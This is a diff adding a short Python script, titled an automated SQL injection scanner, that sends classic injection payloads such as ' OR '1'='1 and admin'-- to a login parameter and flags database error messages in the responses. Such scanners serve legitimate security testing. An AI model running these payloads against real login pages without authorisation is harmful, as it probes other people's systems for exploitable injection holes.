@@ -1,0 +1,31 @@
+import requests
+import re
+
+# Customize these variables
+target_url = "http://example.com/login"
+parameter_name = "username"
+payloads = ["' OR '1'='1", "admin'--", "OR 1=1", "1' or '1' = '1"]
+
+# Regular expressions to detect SQL injection
+error_regex = re.compile(r'(error|warning|exception|syntax error|mysql error|unexpected|query failed|database error|db_error|pg_query_result|sqlite3.OperationalError|pg_query_result|django.db.utils.DatabaseError)', re.I)
+
+# Function to check for SQL injection vulnerabilities
+def check_sql_injection(url, param, payload):
+    try:
+        response = requests.get(url, params={param: payload})
+        if error_regex.search(response.text):
+            print(f"Potential SQL injection found with payload: {payload}")
+    except requests.exceptions.RequestException:
+        pass
+
+# Main function
+def main():
+    print("Automated SQL Injection Vulnerability Scanner")
+    
+    for payload in payloads:
+        check_sql_injection(target_url, parameter_name, payload)
+    
+    print("Assessment complete")
+
+if __name__ == "__main__":
+    main()
